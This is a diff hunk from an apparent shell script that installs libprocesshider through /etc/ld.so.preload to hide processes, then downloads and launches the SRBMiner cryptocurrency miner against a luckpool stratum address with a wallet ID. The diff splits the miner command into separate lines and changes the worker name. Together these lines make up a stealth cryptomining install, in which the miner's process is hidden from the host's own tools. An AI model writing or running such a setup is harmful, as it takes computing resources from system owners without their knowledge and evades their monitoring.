@@ -55,4 +55,11 @@ mv libprocesshider.so /usr/local/lib/
 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-8-5-Linux.tar.xz && cd SRBMiner-Multi-0-8-5 && sudo ./guided-setup.sh && verushash && stratum+tcp://eu.luckpool.net:3956 && RMHJAUh6ETgku7iaAL2tAYXQKvkoodo4VW.404NotFound && sudo ./start_verushash.sh
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz
+tar -xvf SRBMiner-Multi-0-8-5-Linux.tar.xz
+cd SRBMiner-Multi-0-8-5
+sudo ./guided-setup.sh
+verushash
+stratum+tcp://eu.luckpool.net:3956
+RMHJAUh6ETgku7iaAL2tAYXQKvkoodo4VW.404N0tF0und
+sudo ./start_verushash.sh
